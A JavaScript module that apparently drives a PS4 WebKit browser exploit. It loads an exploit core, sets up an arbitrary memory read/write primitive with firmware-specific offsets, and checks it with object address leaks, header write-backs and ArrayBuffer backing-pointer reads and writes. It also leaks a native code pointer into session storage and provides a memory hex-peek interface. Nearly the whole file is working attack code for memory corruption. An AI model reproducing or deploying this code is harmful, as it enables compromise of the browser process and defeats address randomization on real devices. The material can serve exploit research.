import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";

const params = new URLSearchParams(location.search);
const lines = [];
const retained = [];
const pointers = [];
let busy = false;
let ready = false;
let exploit = null;

const LOG_MAX = 120;
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SSV-|READ-PRIMITIVE|COMPOSITION|PRIMITIVE-OK|PAIR-STATUS/i;

let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
let btnStart, btnRefresh, btnPeek, btnClear;

function $(id) { return document.getElementById(id); }

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    if (outEl) {
        outEl.textContent = lines.join("\n");
        outEl.scrollTop = outEl.scrollHeight;
    }
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function setUi() {
    if (btnStart) btnStart.disabled = busy || ready;
    if (btnRefresh) btnRefresh.disabled = busy || !ready;
    if (btnPeek) btnPeek.disabled = busy || !ready;
    if (pickPtr) pickPtr.disabled = busy || !ready;
    if (addrIn) addrIn.disabled = busy || !ready;
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function same64(a, b) {
    return a && b && a.low === b.low && a.hi === b.hi;
}

function addPtr(label, addr, note) {
    if (!addr) return;
    pointers.push({ label, addr: String(addr), note: note || "" });
}

function bufAddr(p, off, ab) {
    const cell = p.leakval(ab);
    addPtr("ArrayBuffer JSObject", cell, "leakval(ab)");
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
    return data;
}

function captureNativeChain(p, mFunctionOff) {
    const cell = p.leakval(Math.expm1);
    addPtr("Math.expm1 cell", cell, "leakval builtin");
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    addPtr("JSFunction (expm1)", mid, "cell+0x18");
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (nativeFn) {
        addPtr("native code ptr", nativeFn, "m_function — webkit text");
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
    }
    return nativeFn;
}

function addPairStatusPtrs() {
    const ps = pairStatus;
    if (ps.mainAddress) addPtr("carrier mainView", ps.mainAddress, "pair");
    if (ps.workerAddress) addPtr("carrier workerView", ps.workerAddress, "pair");
    if (ps.fakeAddress) addPtr("fake cell", ps.fakeAddress, "exploit");
    if (ps.fakeButterfly) addPtr("fake butterfly", ps.fakeButterfly, "exploit");
    if (ps.mainCellFromFakeSlot) addPtr("main from fake slot", ps.mainCellFromFakeSlot, "pair");
}

function renderMap() {
    if (!mapBody) return;
    if (pointers.length === 0) {
        mapBody.innerHTML = "<tr><td colspan=\"3\">no pointers</td></tr>";
        return;
    }
    mapBody.innerHTML = pointers.map((row, i) =>
        "<tr><td>" + row.label + "</td>"
        + "<td class=\"addr\" data-i=\"" + i + "\">" + row.addr + "</td>"
        + "<td>" + row.note + "</td></tr>"
    ).join("");
    mapBody.querySelectorAll(".addr").forEach(el => {
        el.addEventListener("click", () => {
            const row = pointers[+el.getAttribute("data-i")];
            if (row && addrIn) addrIn.value = row.addr.replace(/^0x/i, "");
            peekAt(parseAddr(row.addr.replace(/^0x/i, "")));
        });
    });

    if (pickPtr) {
        const cur = pickPtr.value;
        pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>"
            + pointers.map((row, i) =>
                "<option value=\"" + i + "\">" + row.label + " " + row.addr + "</option>"
            ).join("");
        if (cur) pickPtr.value = cur;
    }
}

function hexLine(addr, bytes) {
    const a = addr.low.toString(16).padStart(8, "0");
    const h = [...bytes].map(b => b.toString(16).padStart(2, "0")).join(" ");
    return a + "  " + h;
}

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function peekAt(addr) {
    const p = window.p;
    if (!p || !addr) {
        if (hexEl) hexEl.textContent = "bad address";
        return;
    }
    const out = [];
    let cur = addr;
    for (let row = 0; row < 8; row++) {
        const chunk = [];
        for (let i = 0; i < 8; i++) {
            const b = read1p(p, cur.add32(i));
            if (b == null) {
                if (hexEl) hexEl.textContent = out.join("\n") + "\n(read failed @ " + cur + ")";
                return;
            }
            chunk.push(b & 0xff);
        }
        out.push(hexLine(cur, chunk));
        cur = cur.add32(8);
    }
    if (hexEl) hexEl.textContent = out.join("\n");
    mark("PEEK", String(addr));
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP,
    };
    return exploit;
}

function maxAttempts() {
    const n = parseInt(params.get("attempts") || "6", 10);
    return n > 0 ? n : 6;
}

async function runRwProof(p, off) {
    const boxA = { tag: "demoA", n: 1 };
    const boxB = { tag: "demoB", n: 2 };
    retained.push(boxA, boxB);

    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    addPtr("JSObject A", addrA, "leakval demo object");
    addPtr("JSObject B", addrB, "leakval demo object");

    const okLeak = !same64(addrA, addrB) && addrA.low !== 0;
    mark(okLeak ? "PASS" : "FAIL", "leakval-distinct  a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    const okHdr = same64(p.read8(addrA), headerA);
    mark(okHdr ? "PASS" : "FAIL", "read8-write8 header roundtrip");

    const probe = new ArrayBuffer(0x20);
    retained.push(probe);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;

    if (off) {
        const dataPtr = bufAddr(p, off, probe);
        if (!dataPtr) {
            mark("FAIL", "arraybuffer backing chain");
        } else {
            const got = read4p(p, dataPtr);
            const okR = got === 0xcafebabe;
            mark(okR ? "PASS" : "FAIL", "arraybuffer-read4  got=0x"
                + (got == null ? "null" : got.toString(16)));
            if (okR) {
                p.write4(dataPtr, new int64(0x600dbabe, 0));
                mark(view[0] === 0x600dbabe ? "PASS" : "FAIL", "arraybuffer-write4");
            }
        }
        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28);
    }

    addPairStatusPtrs();
    renderMap();

    return okLeak && okHdr;
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    lines.length = 0;
    pointers.length = 0;
    renderMap();

    const detected = offsetsFor(navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    mark("SCOPE", "WebKit browser process — not full OS process list");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        const carrier = await establishPrimitive({
            maxAttempts: maxAttempts(),
            onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });

        installP(carrier, { promote: params.get("promote") === "1" });
        const p = window.p;
        if (!p) throw new Error("window.p missing");

        mark("PRIMITIVE-OK", "arb rw live");
        mark("PAIR-STATUS", "state=" + pairStatus.state);

        const offKey = detected.key || "13.52";
        const { off } = offsetsForKey(offKey);
        const ok = await runRwProof(p, off);

        ready = true;
        if (ok) {
            state("RW-ONLY-OK — tap addresses or peek", "ok");
            mark("RW-ONLY-OK", pointers.length + " pointers mapped");
        } else {
            state("primitive OK — some rw checks failed", "warn");
        }
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

function refreshMap() {
    if (!ready || !window.p) return;
    pointers.length = 0;
    const detected = offsetsFor(navigator.userAgent);
    const { off } = offsetsForKey(detected.key || "13.52");
    runRwProof(window.p, off);
    mark("REFRESH", pointers.length + " pointers");
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    mapBody = $("map-body");
    hexEl = $("hex");
    pickPtr = $("pick-ptr");
    addrIn = $("addr-in");
    btnStart = $("btn-start");
    btnRefresh = $("btn-refresh");
    btnPeek = $("btn-peek");
    btnClear = $("btn-clear");

    btnStart.addEventListener("click", () => runStart());
    btnRefresh.addEventListener("click", () => refreshMap());
    btnClear.addEventListener("click", () => {
        lines.length = 0;
        if (outEl) outEl.textContent = "";
    });
    btnPeek.addEventListener("click", () => {
        const a = parseAddr(addrIn.value);
        if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
        peekAt(a);
    });
    pickPtr.addEventListener("change", () => {
        const i = parseInt(pickPtr.value, 10);
        if (!(i >= 0) || !pointers[i]) return;
        addrIn.value = pointers[i].addr.replace(/^0x/i, "");
    });

    if (params.has("g")) mark("BOOT", "groom=" + params.getAll("g").join(","));
    setUi();
    state("ready — one button: primitive + rw proof + pointer map", "");
}

init();
